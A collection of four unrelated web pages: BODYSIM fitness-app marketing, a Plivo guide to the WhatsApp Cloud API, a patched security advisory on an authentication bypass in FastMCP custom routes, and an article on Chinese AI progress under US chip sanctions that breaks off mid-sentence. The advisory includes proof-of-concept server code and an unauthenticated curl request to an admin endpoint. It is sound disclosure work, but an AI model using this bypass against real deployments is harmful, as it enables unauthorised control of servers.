title: Your Pocket Personal Trainer
summary: How BODYSIM can replace all your workout apps and help you see results in the gym.
body_text: Your Digital Twin is Your Pocket Personal Trainer Most people we’ve talked to who sign up for a personal training program are looking for support, motivation, and most importantly a personal program that will make their body transformation attainable and less painful. BODYSIM provides more tailored, focused and quantified attention than is possible from a conventional personal trainer, even those celebrity trainers that make as much as $15,000 for a six week program. Your digital twin is your perfect-match personal trainer, recommending a scheduled plan and reflecting progress. Science and your own evolving personal biometrics inform when to push and when to recover with the knowledge of what your body needs. Your twin will keep you on track towards achieving your goals using a combination of resistance training, blood testing, food logging and mental health scoring. New to Resistance Training? BODYSIM is there for you The choices can feel overwhelming when you are new to resistance training. Which exercises should you do? Free weights or machines? How much and how often? Even if you have been resistance training for a while, switching up your workouts to make better progress and prevent burnout can still present anxiety regarding choices because you don’t want to lose ground after all you’ve accomplished. Starting with a baseline of your training age 1 that shows you where your current musculature is relative to your potential, BODYSIM uses an initial DEXA scan, your food journal, and daily weigh-ins in combination with your training age and beginning 3D body measurements to create a fitness forecast. Your digital twin will chart the path to your peak potential from your current state and effort. Target the Right Muscles Once you know what to expect, BODYSIM directs you along the frontier of training efficiency so that you get the most out of your training with a personalized exercise selection and sets-per-week that maximize gains. Along with training age and how often you can workout, BODYSIM uses an in-app 3D body scan to take measurements of each muscle group and forecast progress toward your body composition goals to assess a selected split (multi-day plan) and suggest additional exercise and volume recommendations. Your digital twin is an unbiased reflection used to determine where more focus is needed. The split recommendations will take those target areas into consideration and adjust volume to balance your muscles. Hyper focus on a muscle group because it’s what you associate with working out can distort your effort and slow progress. You can’t hit your muscular potential all in the biceps. Keep a Training Log Resistance training is a gap with most activity trackers. BODYSIM easily moves from measurement, to plan recommendations, to execution at a level of detail that respects the effort you put into your workouts. Your watch can know if you reported strength training but it can’t know if you lifted hard enough. Your BODYSIM digital twin provides a true measure of resistance training intensity so you can know if you are traversing your path as quickly as possible. You not only get detailed instructions on how to perform each exercise in our extensive library. Your twin assesses training intensity as your 1RM, which is the maximum amount of weight you can lift in repetition, charts your progress and forecasts your next increment per exercise. Bump Up the Effort If you can do more, your twin lets you know by providing progressive overload recommendations that link your BODYSIM training age to a literature model of >10k users over 5 years progressed optimally by personal trainers. The combination of intensity and blood test results helps you understand if you are effort limited, if your glycogen store is limited or if you are hormonally gated. Why the focus on Progressive Overload? We know that increasing lean muscle is key to hitting your goals and your metabolism is very good at mastering efficiency. Maybe you’ve made great progress, but what got there won’t keep you there. Even if you have been over-training, the Progressive Overload challenges the right muscles, the right way. BODYSIM workouts aim to move you along the training age curve efficiently, getting to your maximum potential as quickly as possible. Keep Seeing Gains by Avoiding Overtraining Your twin also safeguards you from overdoing it by assessing your risk of overtraining syndrome (OTS). BODYSIM incorporates the results of at-home blood testing to determine not only if you are nutritionally or hormonally limited but to detect signs of excess stress on your body. Those tests will indicate if you are underfueling your body leading to excessive fatigue. Your twin will recommend in app completion of the POMS (Profile of Mood States) survey which is a research-driven tool to detect signs of overtraining before physiological or immunological symptoms present themselves. We’ve put together an integrated package that pulls all of your data and the best research in sports science together to enable the creation of your digital twin. While it would certainly be nice to also include the charisma and charm of a celebrity trainer, we think you are going to like your nerdy pocket-sized digital twin who is all about you. Training age refers to the total training time/ experience relative to resistance training in this instance. ↩︎

title: WhatsApp Cloud API: What It Is, How It Compares, and How to Get Started
summary: Discover what WhatsApp Cloud API is, how it compares to WhatsApp Business API, and a step-by-step guide to getting started.
body_text: Managing large-scale conversations can be a challenge—especially for growing businesses. To meet this demand, Meta launched the WhatsApp Cloud API in May 2022. This API lets businesses quickly connect with customers, offering a secure and scalable way to chat — no matter where they are. While the Cloud API is easy to set up with no hosting fees, it does limit customization and control. That’s where Plivo’s WhatsApp Business API comes in. Plivo offers more flexibility and control during setup, which can be beneficial for businesses in need of a more tailored solution. In this guide, we’ll cover everything from setting up the Cloud API to real-world use cases, and also explore how Plivo’s API can offer more customization for businesses that need it. WhatsApp Cloud API 101 Before launching the WhatsApp Cloud API, Meta offered three versions of WhatsApp: The standard WhatsApp app for personal use. WhatsApp Business for small- to mid-sized businesses. WhatsApp Business API for companies that needed advanced features. So, what makes WhatsApp Cloud API different from all of these versions? Let’s learn more about it. What is WhatsApp Cloud API? The WhatsApp Cloud API is a version of the WhatsApp Business Platform that runs on Meta’s cloud servers. Unlike the older version, which required hosting on private servers or through a business solutions provider (BSP) , the Cloud API removed the need for businesses to manage their own servers. Why did Meta create the Cloud API? The older on-premises API had its drawbacks. Set up took time, updates were slow to reach businesses, and server maintenance was expensive. How does WhatsApp Cloud API work? Here’s how the WhatsApp Cloud API works: Cloud-based architecture: Hosted on Meta’s servers, it provides a reliable and scalable infrastructure for messaging. Messaging capabilities: Businesses can exchange text, images, videos, and documents programmatically using API endpoints. Automation and bots: It supports automated workflows, such as sending appointment reminders or responding to frequently asked questions. Integration-friendly: The API connects seamlessly with other tools, streamlining customer communication processes. Multi-agent support: Teams can manage conversations collectively, ensuring faster response times and better customer service. What’s the difference between the WhatsApp on-premises API and Whatsapp Cloud API? Understanding the differences between the WhatsApp on-premises API and the WhatsApp Cloud API is key to choosing the right solution for your business. Let’s explore how they compare. Feature WhatsApp on-premises API WhatsApp Cloud API Access Requires registration with a BSP Free access via Meta Hosting Businesses or BSPs need to host the API on their own servers Hosted by Meta, eliminating server management Costs BSPs cover server setup and maintenance costs, along with per-message charges Businesses only pay per message or conversation API protocol REST API Graph API Maintenance BSPs manage software updates and new feature integrations Meta handles updates and releases new features Server location Based on the business’s infrastructure Located in North America, managed by Meta Uptime Dependent on the BSP’s infrastructure reliability Meta aims for 99.9% uptime Sticker pack management Supported for managing custom sticker packs Not supported WhatsApp business Cloud API features The WhatsApp Cloud API comes with features that allow businesses to easily connect WhatsApp with their existing tools and workflows. Here are its main offerings: Seamless integration with Meta Businesses can connect their systems to WhatsApp through Meta’s cloud platform. This ensures smooth and dependable communication with customers. Versatile messaging options The WhatsApp Cloud API supports text, media such as images, videos, audio, GIFs, and files, as well as contact cards and location sharing. It also facilitates interactive messages like list messages, reply buttons, and single or multi-product messages. Additionally, businesses can use message templates for both text and media, incorporating interactive options for customer engagement. Data access across platforms The Graph API allows businesses to access and send data easily across different Meta platforms, including WhatsApp, Facebook, and Instagram. It uses a single point of connection, so businesses don’t need to connect separately to each platform. This makes it simpler for businesses to manage data, whether it's about users, posts, or events, all from one place. Global accessibility with no setup fees The WhatsApp Cloud API is hosted in North America, but it allows businesses worldwide to connect with customers. This gives them access to WhatsApp’s large user base. Meta offers the Cloud API for free, so businesses don't have to pay setup or access costs. However, businesses will still pay for the messages they send. Easy-to-use API documentation Meta offers straightforward API documentation, making it easier for developers to connect their systems to WhatsApp. This helps businesses build customized solutions and drive innovation. Scalable and secure communication The WhatsApp Cloud API enables businesses to scale their communications as they grow. It meets Meta’s strict security and privacy standards, ensuring both business and customer conversations remain secure. How to get WhatsApp Cloud API Setting up the WhatsApp Cloud API can vary depending on the method you choose. Here’s a quick comparison between using a BSP like Plivo and going through Meta directly. Feature Embedded signup through a BSP Meta for Developers Method Register through a BSP platform Create an app on Meta's platform Developer resources No resources provided Access to comprehensive developer tools Steps Connect to Facebook Business Manager, set up WABA, and verify phone number Set up development tools, send test message, configure webhook, set up WABA, and verify phone number Onboarding time Less than 5 minutes Several hours for completion Using an embedded signup Signing up through a BSP enables you to complete the process in just a few steps. The signup flow is simple and stays entirely within the site. Here’s how to do it with Plivo: Step 1: Create a WABA in the Plivo console To set up your WABA in Plivo, register a phone number that can receive an OTP via text or call. You'll use this number to message customers on WhatsApp. You can either rent a number from Plivo or use your own. If you’re moving from another provider, you can transfer your number to Plivo. Be sure to check Meta's guidelines and Plivo’s requirements for registration and migration. Step 2: Customize your WhatsApp profile Pick a display name for your WhatsApp account and follow the setup guidelines. Then, grant Plivo the necessary permissions to act as your WhatsApp solution provider. Step 3: Verify successful onboarding To confirm your setup is successful, check your Meta Business Account. First, choose your Meta account, then go to Business Settings and click on WhatsApp Accounts. In the Partners tab, Plivo should appear as your partner. Then, go to the Settings tab, where you'll find 'PLIVO INC' listed as a payment option. Once you open "WhatsApp Manager," your number should show as connected. Step 4: Register WhatsApp templates Businesses must use WhatsApp messages templates approved by Meta. You can create new templates in WhatsApp Manager. Meta segments templates into utility, marketing, or authentication categories, based on the message content. The category impacts both the conversation type and the cost. In the Plivo console , you can find template information. Navigate to Messaging > WhatsApp Business Account > Templates to sync and view details from Meta. Step 5: Manage your business phone number Go to WhatsApp > WhatsApp Business Account to manage business phone numbers in Plivo. Select your account and click on 'Configurations.' To add a phone number, use the ‘+Add Phone Number’ button found under account details. After adding, you can also unlink numbers if needed. This section also shows the connection status (whether it’s connected, pending, or disconnected), the name status (which reflects Meta’s verification), and the quality rating, based on how recipients respond to your messages. Using Meta Using the Cloud API through Meta requires development skills, such as making API calls to send and receive messages and setting up a webhook endpoint to handle message notifications. You’ll also need to switch between Meta for Developers, your webhook server (like Glitch), and the WhatsApp application to test everything. To learn more about these steps, refer to Meta’s documentation . Note: Meta prohibits independent software vendors from developing the WhatsApp Cloud API for clients. Non-compliance with WhatsApp's Commerce Policy may lead to suspension or removal of API access. WhatsApp Cloud API pricing Businesses can access the WhatsApp Cloud API for free, but they pay based on their conversations with users. Conversations on the WhatsApp Cloud API fall into two categories: user-initiated and business-initiated. A user-initiated conversation occurs when a user sends a message to a business, and the business responds within 24 hours. On the other hand, a business-initiated conversation happens when the business messages a user after the 24-hour window following the user's initial message. WhatsApp offers the first 1,000 conversations each month for free. Once businesses exceed this limit, they must add a credit card to their account to continue using the service. Even if a WABA has multiple phone numbers, the 1,000 free conversation limit still applies, and it resets monthly. In addition, businesses won’t incur charges when users contact them through the business’s call to action (CTA) button. Pros of using the Whatsapp Cloud API The WhatsApp Cloud API offers several advantages for businesses looking to integrate WhatsApp messaging into their customer service and communication workflows. title: Authentication bypass on FastMCP custom routes
summary: FastMCP.customroute() allows developers to mount arbitrary HTTP handlers intended for sensitive use cases such as OAuth callbacks or admin APIs, but it…
body_text: Back to Hacktivity Status: Patched This vulnerability has been verified as resolved and deployed. Anthropic Critical 2025 Authentication bypass on FastMCP custom routes Summary Broken Access Control in FastMCP custom routes FastMCP.custom_route() allows developers to mount arbitrary HTTP handlers intended for sensitive use cases such as OAuth callbacks or admin APIs, but it never applies RequireAuthMiddleware even when the server is configured with a token verifier. Only the built-in SSE and StreamableHTTP endpoints are wrapped; custom routes are appended to the Starlette app as-is while Starlette’s AuthenticationMiddleware merely records credentials without rejecting unauthenticated requests. As a result any HTTP endpoint registered through @server.custom_route() remains publicly accessible despite OAuth or token-based authentication being enabled for the server. Attackers can directly invoke privileged administration handlers over the network without presenting credentials. CVSS Score Vector N Complexity L Privileges N User Interaction N Scope U Confidentiality H Integrity H Availability L CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L Vulnerability Location Source Line 685 src /mcp /server /fastmcp /server.py FastMCP.custom_route Sink Line 920 src /mcp /server /fastmcp /server.py FastMCP.sse_app Source-to-Sink Analysis 1 src/mcp/server/fastmcp/server.py:921 Custom Starlette routes registered via custom_route() are appended to the SSE app without additional middleware. PYTHON routes.extend( self ._custom_starlette_routes) 2 src/mcp/server/fastmcp/server.py:716 custom_route() stores the developer handler as-is with no authentication enforcement even though docstring suggests admin usage. PYTHON self ._custom_starlette_routes.append(Route(path, endpoint=func,...)) 3 src/mcp/server/fastmcp/server.py:953 Even when auth is enabled only AuthenticationMiddleware is added globally; it does not reject unauthenticated requests, so custom routes remain open. PYTHON if self ._token_verifier: middleware = [Middleware(AuthenticationMiddleware, backend=BearerAuthBackend(...)), Middleware(AuthContextMiddleware)] 4 examples/servers/simple-auth/mcp_simple_auth/legacy_as_server.py:84 Attacker-controlled HTTP request reaches privileged handler without proving identity, enabling arbitrary admin operations. PYTHON request = await func(request) Impact Analysis Critical Impact Whatever privileged operations the route performs (e.g., issuing OAuth tokens, modifying server state) happen with attacker input. Confidentiality, integrity, and availability of the server are compromised. Attack Surface Any MCP deployment that calls FastMCP(..., token_verifier=..., auth=AuthSettings(...)) and registers routes via @server.custom_route() . Preconditions None; attacker only needs network access. Authentication is enabled but not enforced on custom routes. Proof of Concept Environment Setup Requirements: Ubuntu 22.04+, Python 3.10+, uv package manager. Install dependencies: BASH git clone https://github.com/modelcontextprotocol/python-sdk.git cd python-sdk uv sync --frozen Target Configuration Create a minimal FastMCP server that enables OAuth-style auth but exposes an admin route: PYTHON from mcp.server.fastmcp import FastMCP from mcp.server.auth.settings import AuthSettings from mcp.server.auth.provider import AccessToken, TokenVerifier from starlette.requests import Request from starlette.responses import JSONResponse class StaticVerifier ( TokenVerifier ): async def verify_token ( self, token: str ): return AccessToken(token=token, client_id= "admin" , scopes=[ "admin" ]) if token == "valid" else None app = FastMCP( token_verifier=StaticVerifier(), auth=AuthSettings( issuer_url= "https://auth.example.com" , resource_server_url= "https://server.example.com" , required_scopes=[ "admin" ], ), ) @app.custom_route( "/admin/restart" , methods=[ "POST" ] ) async def restart ( _: Request ): return JSONResponse({ "status" : "restarted" }) if __name__ == "__main__" : app.run(transport= "streamable-http" ) Run the vulnerable server: BASH uv run python vulnerable_server.py # Server listens on http://127.0.0.1:8000/mcp Exploit Delivery Unauthenticated attack: BASH curl -X POST http://127.0.0.1:8000/admin/restart Outcome An Internet attacker can trigger any custom admin route without valid tokens (resetting state, altering configuration, dumping data, etc.), fully bypassing the configured OAuth/token protections. Expected Response: JSON { "status" : "restarted" } No Authorization header is required even though the server advertises admin scope enforcement. Run this level of analysis on your repo. title: China's AI Leap: Surpassing U.S. Chip Sanctions with Innovative Advancements
summary: Despite strict U.S. chip restrictions, China is making significant strides in AI development through innovative strategies. By focusing on algorithm advancements, maximizing less powerful chips, and releasing competitive models that sometimes outshine U.S counterparts, China is raising questions about the effectiveness of ongoing export controls and reshaping the global AI arena.
body_text: AI Innovations Defy U.S. Export Controls China's AI Leap: Surpassing U.S. Chip Sanctions with Innovative Advancements Despite strict U.S. chip restrictions, China is making significant strides in AI development through innovative strategies. By focusing on algorithm advancements, maximizing less powerful chips, and releasing competitive models that sometimes outshine U.S counterparts, China is raising questions about the effectiveness of ongoing export controls and reshaping the global AI arena. Introduction: China's AI Advancements Amidst US Chip Restrictions China's advancements in artificial intelligence (AI) represent a significant development on the global technological stage. Despite facing stringent restrictions imposed by the United States on high‑tech semiconductor exports, China has demonstrated remarkable resilience and adaptability. The nation has focused on maximizing the capabilities of less powerful chips that remain accessible, innovating in AI algorithms, and leveraging open‑source models to push forward its AI agenda. This strategic pivot has allowed Chinese tech giants like Alibaba, DeepSeek, and Tencent to produce AI models that not only compete with but in some circumstances outperform their U.S. counterparts. This progress invites scrutiny and dialogue among global leaders about the sustainability of current export controls and their broader implications for international AI development . Chinese AI advancement is not merely a feat of technology but one of strategic innovation in the face of adversity. The country's decision to invest in lower‑performance but readily available chips rather than exclusively seeking top‑tier semiconductor technology has been a key element of this advancement strategy. Furthermore, China's robust development in AI is supported by a strong and increasing focus on human capital, with significant investments in AI talent cultivation. Notably , China produces a greater number of world‑leading AI researchers than the United States, highlighting the country's substantial commitment to not only sustaining but leading advancements in AI. The success of China's AI sector challenges the long‑held dominance of the United States in this field, raising important questions about the future trajectory of AI on a global scale. There is growing concern over how these advancements might impact global power dynamics, economic growth, and military technologies. The presence of highly competitive AI models from China also poses the possibility of a shift in global technology adoption patterns, as countries could increasingly consider more robust Chinese AI systems for various applications, influencing the broader geopolitical landscape. Despite these advancements, questions persist regarding the long‑term effectiveness of U.S. export controls. While these measures have aimed to stifle China's access to cutting- edge technology, the ongoing successes of Chinese AI models suggest that alternate strategies have mitigated some of the intended effects. This situation has led to calls for a reassessment of the current U.S. policy focus, with suggestions to pivot toward more strategic control over military AI applications, instead of broad restrictions that may unintentionally spur innovation from less advanced technologies. The future of AI policy and international cooperation remains a pivotal discussion point as the landscape continues to evolve with China's unexpected advancements. Considerable debate surrounds the reconciliation of restrictive policies with the need for international collaboration to manage the risks associated with advanced AI capabilities. Indeed, fostering dialogue between leading AI nations is increasingly seen as essential to establishing sensible governance frameworks that reflect the multifaceted nature of AI technologies. These discourses coincide with discussions about potential shifts in export control strategies to better align with the realities of technological advancement and the geopolitical pressures they entail. Overcoming Hardware Limitations: China's Alternative Strategies The rapid evolution of artificial intelligence (AI) technologies is reshaping global power dynamics, with China at the forefront of these changes despite facing significant hardware limitations due to external restrictions. As noted by Gregory Allen from the Center for Strategic and International Studies (CSIS), China is overcoming the lack of access to cutting- edge chips by employing alternative strategies, such as making substantial advances in algorithm innovation and relying on open‑source models. This adaptive approach has allowed Chinese companies to develop AI models that rival those of their U.S. counterparts, challenging the global AI development hierarchy. Chinese tech giants such as Alibaba, Tencent, and newer players like DeepSeek, are making remarkable strides in releasing AI models that perform exceptionally well on international benchmarks. In some cases, these models have even surpassed those developed by U.S. firms. Omar Sanseviero, an expert in open‑source AI, highlights the diminishing skepticism regarding the capabilities of Chinese AI models. As a result, the question arises about the long‑term efficacy of U.S. export controls, which were designed to limit China's access to advanced computing technologies like AI chips. U.S. export controls aimed at stifling China's technological rise now face scrutiny regarding their effectiveness. These restrictions, although significant, have not prevented China from rapidly advancing its AI capabilities. China's progress is raising questions about the potential need for a reevaluation of the strategic focus, suggesting that restrictions might be better directed at military AI applications rather than general‑purpose developments. The ongoing technological tug‑of‑war between the U.S. and China is not only influencing economic tactics but also shaping geopolitical strategies globally. The competitive race in AI development has broader implications beyond technology. As AI's influence on economic growth and military capabilities grows, the global power balance could shift, leading to economic realignment and new geopolitical alliances. Moreover, the bifurcation in AI standards between the East and the West could affect international collaboration . Paul Triolo from Albright Stonebridge Group emphasizes the likelihood of distinct AI ecosystems forming as a result of the rivalry, impacting everything from innovation to economic policies worldwide. China is proactively investing in AI talent, aiming to nurture and attract top‑tier researchers, which complements their strategies to compensate for hardware constraints. Kendra Schaefer of Trivium China pointed out that China's strategic investments in its AI workforce are crucial in maintaining its rapid pace of development . These efforts further underscore China's commitment to securing a prominent position in the global AI landscape despite facing technological sanctions and competition. Competitive Edge: Chinese AI Models Challenging US Dominance China's rapid advancement in AI is a testament to its strategic adaptability in the face of technological limitations imposed by U.S. export controls. Even with restricted access to advanced semiconductor technology, Chinese AI developers like Alibaba, Tencent, and DeepSeek are producing competitive models that not only rival but sometimes outperform their U.S. counterparts in certain benchmarks. This success is largely attributed to China's strategic pivot towards algorithmic innovation, open‑source model utilization, and the efficient deployment of less powerful, unrestricted chips. The burgeoning capability of Chinese AI models has sparked discussions about the effectiveness of continued U.S. export controls. There is a growing sentiment that these restrictions may not suffice to suppress China's AI ambitions given its alternative strategies and adaptations. Chinese advancements are not just technological triumphs; they represent potential shifts in global power dynamics, posing challenges to the technological hegemony previously held by the U.S. Such developments raise critical questions about whether these export controls are sustainable or whether they require a strategic overhaul. Compounding the technological arms race, the global landscape is witnessing a shift as nations must navigate between choosing Chinese or American AI ecosystems. This bifurcation reflects widening geopolitical rifts and highlights the urgent need for international collaboration . However, this cooperation is fraught with tension, as countries grapple with the decision to align with either camp, potentially fragmenting global AI norms and standards further. There is a pressing need for dialogue and negotiation around ethical AI deployment and shared governance frameworks. Chinese companies' steady AI progress emphasizes the nation's long‑term commitment to becoming a technological leader, supported by significant governmental investments in domestic talent and industry. While the current advancements have relied heavily on optimizing existing resources, questions remain about the future sustainability of these strategies. Experts like Gregory Allen note that while using large quantities of less powerful chips is effective now, it may not remain economically viable in the long run. Nonetheless, China's burgeoning AI capabilities are undeniable, contributing to a narrowing gap between the two superpowers. As AI continues to evolve, both nations face challenges distinct to their advancement paths. In the U.S., maintaining technological supremacy requires balancing restrictive measures with the fostering of innovation. In China, ensuring the sustainability and ethical deployment of AI technologies is paramount. The future of AI policy may require both nations to rethink their stances, particularly concerning military AI applications. In the broader picture, a global consensus on AI governance appears essential to mitigate the risks AI presents to national security , economic balance , and societal norms. The Effectiveness of US Export Controls on China's AI Progress The United States has implemented export controls on cutting- edge semiconductor technology, aiming to curb China's advancement in artificial intelligence (AI). However, despite these restrictions, China continues to make significant strides in the AI sector. The country's success is largely attributed to strategic adaptation, which includes a focus on developing advanced algorithms, optimizing existing chip performance, and leveraging open‑source AI models. These efforts have enabled Chinese tech giants such as Alibaba, DeepSeek, and Tencent to produce AI systems that rival or surpass those developed in the U.S. China's ability to navigate around U.S. export controls raises important questions about the long‑term effectiveness of these restrictions. While they have certainly made it more challenging for Chinese companies to access state‑of‑the‑art chips, the impact on China's overall AI progress appears to be limited. Some experts suggest that the global AI landscape may shift as a result, potentially eroding U.S. dominance in this critical field. The implications are profound, influencing everything from economic growth to military capabilities, as AI is increasingly integrated into various national strategies. The debate over U.S. export controls also highlights the difficulty in balancing national security concerns with the need for international cooperation in AI development . Many experts argue that rather than broad restrictions, there should be a more targeted focus on preventing military AI applications. This perspective points to the importance of global dialogue and shared frameworks to mitigate the risks associated with advanced AI technologies. Without such cooperation, the potential for geopolitical tensions to escalate increases, as nations either align with Western or Chinese AI ecosystems. Public reactions to China's AI advancements are mixed, reflecting a complex interplay of concerns over global power shifts, technological leadership, and ethical standards. There are those who express alarm over the challenges to U.S. technological supremacy and the potential for AI‑driven military advantages. Conversely, some voices advocate for a reassessment of export control strategies, emphasizing the role of dialogue and international collaboration to ensure an ethical and balanced approach to AI governance. Looking to the future, the implications of China's progress in AI extend beyond immediate technological and economic domains. The potential for separate AI ecosystems emerging between China and the West could lead to increased competition but also accelerate innovation and expand market opportunities. Social and cultural dynamics are also at play, as global norms around AI ethics and data privacy continue to evolve. Amidst these changes, the need for effective AI governance remains paramount, requiring innovative policy solutions and international cooperation. Global Power Dynamics: AI's Influence on International Relations In recent years, artificial intelligence has rapidly become a cornerstone of global innovation and development , significantly influencing international relations and power dynamics. The acceleration of AI technologies worldwide heralds a new wave of geopolitical shifts, with major players like China and the United States striving for dominance. This section will delve into how AI is altering global power structures, potentially reshaping alliances, and creating new competitive landscapes. Historically, technological advancements have played crucial roles in global power dynamics, often redefining national boundaries and economic influences. With AI's integration into sectors such as defense, healthcare , finance , and communication , countries are refocusing their strategies to leverage AI's potential for economic and military gain. This technological race is not just about superior algorithms or the best data sets, but also about strategic influence on the global stage. As China continues to develop its AI capabilities, funded heavily by state‑supported initiatives and a strong focus on education and talent cultivation, it challenges the traditional technology leadership of the United States. The U.S., despite leading in many areas of AI research and proprietary technologies, is encountering pressures from China's aggressive advancements. This rivalry is manifested through various means, including the development of semiconductors, AI algorithms, and international AI policies, all of which are influencing the power equilibrium globally. AI's impact extends beyond economic gains and military capabilities. It is fostering new diplomatic dialogues and tensions, urging the international community to collectively address the ethical implications and regulatory frameworks needed to manage AI's growth. Concerns over privacy, surveillance, and digital rights are becoming central to international discussions, demanding a balance between national security and global cooperation to avoid further geopolitical fragmentation. In conclusion, AI's unprecedented growth trajectory presents both challenges and opportunities for international relations. The race for AI supremacy is not just an economic or technological battle, but a comprehensive geopolitical contest, influencing everything from national security policies to global economic orders. As nations grapple with the implications of AI, the international community's ability to cooperate and establish equitable rules will play a critical role in shaping a stable and sustainable AI‑powered future. Balancing Act: Restricting AI Development Versus International Collaboration The debate around AI development is often caught between two crucial standpoints: the restriction of AI advancements to mitigate risks and the promotion of international collaboration to harness its benefits. As China accelerates its AI development despite facing U.S.-imposed chip restrictions, this balancing act has become a focal point of global discussion. China's approach underscores a shift towards leveraging algorithmic innovation and utilizing open‑source models to mitigate hardware limitations. This strategy has enabled Chinese tech giants like Alibaba, DeepSeek, and Tencent to release AI models that compete with, and in some cases outperform, their U.S. counterparts. These developments, achieved without unrestricted chip access, highlight China's commitment to maintaining its technological trajectory. The effectiveness of U.S. export controls is under scrutiny as China's AI sector continues to thrive. This situation sparks a debate about the long‑term efficacy of such restrictions and whether they might inadvertently encourage more strategic and innovative approaches within the restricted nation. The global AI landscape could be significantly altered as other nations observe and potentially follow China's example. International collaboration appears increasingly necessary to address the multifaceted risks associated with AI, especially as its influence on global power dynamics grows. There's a growing call for dialogue, primarily between key players like the U.S. and China, to develop frameworks that balance innovation with security . This dialogue is crucial to managing AI's potential impact on economic growth, military capabilities, and global governance standards. The future of AI policy might rest on a reevaluation of priorities. Some experts suggest that rather than focusing entirely on restricting general‑purpose AI advancements, emphasis should be placed on preventing the development of specific military applications. This shift could lead to more effective and targeted regulations that promote safe and ethical AI use globally, while fostering an environment conducive to innovation. Public Sentiments: Reactions to China's AI Developments China's rapid advancements in artificial intelligence (AI) have elicited a wide range of responses globally, igniting debates over the efficacy of the United States' chip export restrictions. As China continues to push the boundaries of AI technology, public sentiments are divided between those who praise the nation's ingenuity and those who fear its implications. Among the concerns is the possible erosion of America's technological leadership, with many observers alarmed by China's progress despite U.S. efforts to control access to advanced semiconductor technology. This development is seen as a potential game‑changer that could shift the global balance of power, influencing economic growth and military capabilities. Critics, both domestic and international, have questioned the effectiveness of the U.S.'s export control measures. Some argue that these restrictions may inadvertently spur innovation within China, pushing it to develop competitive alternatives using open‑source models and optimize the performance of existing chipsets. Skeptics of China's AI advancements often point to the gap that remains with Western closed‑source AI models. Yet, as benchmarks for AI capabilities evolve, the reliability of these comparisons is increasingly scrutinized. This has led to a reassessment of how AI benchmarks are used in evaluating global AI prowess. In addition to strategic and technological concerns, China's advancements in AI raise ethical questions, particularly regarding data privacy and surveillance. Observers worry that China's AI models, underpinned by different standards, might set precedents that challenge current global data practices. The evolving landscape has prompted calls for international cooperation. While some advocate for a unified approach to tackle advanced AI risks, others doubt the feasibility of such collaboration due to ongoing geopolitical tensions. Yet, the consensus leans towards increased dialogue and cooperation to establish robust governance frameworks. Looking ahead, the future implications of China's AI growth are profound. Economically, the potential bifurcation of the global AI market could lead to distinct ecosystems for Chinese and Western technologies. This separation could prompt increased competition in AI‑driven industries, fostering innovation and potentially lowering costs globally. Future Implications: Economic, Social, and Technological Dimensions China's rapid advancements in artificial intelligence , even under the weight of U.S. chip restrictions, are poised to redefine the global economic, social, and technological landscapes. The first notable consideration is the potential bifurcation of the global AI market, as nations and businesses may be forced to align with either Chinese or Western tech ecosystems. Such a division could foster increased competition, possibly spurring innovation and reducing costs worldwide. Furthermore, China's burgeoning AI capabilities could shift the global economic balance , enhancing its productivity and competitiveness on the world stage while potentially disrupting established supply chains. From a social perspective, China's AI progress promises both opportunities and challenges. As AI technologies become more integrated into daily life, we may witness a divergence in ethical standards and data privacy practices between China and the West. This difference could reshape global norms surrounding technology use and surveillance, potentially impacting personal freedoms. Additionally, as AI continues to advance, there is looming concern over job displacement across industries, necessitating substantial workforce retraining and adaptation. Politically, the stakes associated with AI capability are immense. As AI becomes a cornerstone of national security strategies, geopolitical tensions may intensify, fostering a new kind of arms race characterized by AI‑driven military advancements. These tensions could complicate efforts to establish unified global AI governance frameworks, given the differing technological approaches and national interests of key players like the U.S. and China. This scenario might also cause smaller nations to navigate new global alliances as they align with either Chinese or Western AI ecosystems. Technologically, the race to dominate AI could spur unprecedented levels of research and development . The competition might lead to diverse AI standards and protocols, which could, in turn, hinder international collaboration efforts. It is also likely that there will be significant advancements in AI chip development and alternative computing methods as a means to overcome existing hardware limitations. Such innovations may eventually diminish the current impact of export controls, prompting a reassessment of international technology policies on a broader scale. In the long term, the importance of international cooperation to mitigate the risks posed by rapid AI advancements cannot be overstated. Despite geopolitical tensions, there is a growing recognition that collaborative frameworks are essential to address the global challenges and ethical considerations posed by AI technology. As the landscape evolves, the global AI scene may become more balanced, with multiple regions emerging as centers of innovation and progress. This potential shift underscores the critical need for proactive dialogue and policy measures that account for the multifaceted implications of AI development . Expert Opinions: Insights on China's Approach to AI and Chip Limitations China's approach to AI and its ability to advance despite U.S. chip restrictions have sparked significant expert analysis and public debate. The nation has developed various strategies to bypass these limitations, including focusing on algorithm innovation, leveraging open‑source models, and maximizing the performance of available, albeit less powerful, chips. This reflects a broader trend of resilience and adaptation among Chinese technology firms, which are increasingly releasing AI models competitive with, and in some cases superior to, those from the U.S. Despite the constraints imposed by U.S. export controls aimed at limiting China's access to advanced chips, the long‑term effectiveness of these measures is questioned by many observers. Experts suggest that these restrictions may not sufficiently deter China’s progress in the AI domain, as Chinese companies continue to innovate with the resources available to them. Moreover, China's advancements could herald a significant shift in the global AI landscape, potentially redefining the balance of power in technology between nations and influencing economic and military dynamics globally. Significant public reaction has accompanied China's AI progress, with concerns about the implications for U.S. technological dominance and the broader global power balance . The discussions have also touched upon ethical concerns, such as data privacy and surveillance, especially given China's different standards and practices compared to Western nations. These developments underscore the complex interplay between technological advancement, national security , and ethical considerations in the field of artificial intelligence . Looking ahead, China’s focus on AI, underpinned by its strategies to mitigate hardware constraints, suggests a potential reshaping of global AI ecosystems. As Chinese AI research continues to thrive, supported by significant government investment and a growing pool of AI talent, the global economic and technological landscape may experience increased competition and bifurcation. This could lead to distinct ecosystems of AI technology emerging, one aligning with Western standards and another with Chinese innovations. In terms of policy, experts propose recalibrating export control strategies by focusing potentially on restricting military AI applications rather than broad, general‑purpose technology limits. This shift is seen as a way to balance international cooperation with national security priorities, as geopolitical tensions and the competitive AI race intensify. The global community may also need to work toward establishing unified AI governance frameworks to address risks associated with advanced AI while fostering innovation. Concluding Thoughts: The Shifting AI Landscape and Global Implications The rapid advancements in AI, particularly by China, signify a transformative shift in global technological capabilities. Despite the U.S. imposing restrictions on advanced chip exports, China has demonstrated significant progress in AI through alternative strategies such as algorithm innovation and the development of open‑source models. This has allowed Chinese companies to release AI models that can compete, and sometimes surpass, their U.S. counterparts. The effectiveness of such U.S. restrictions is now being questioned, especially when faced with China's relentless advancements. China's ability to advance its AI capabilities poses profound implications for the global power dynamics. As Chinese companies like Alibaba and Tencent develop competitive AI technology, the traditional dominance of U.S. tech firms faces challenges. This shift suggests a potential alteration in the economic and geopolitical landscape, where China's 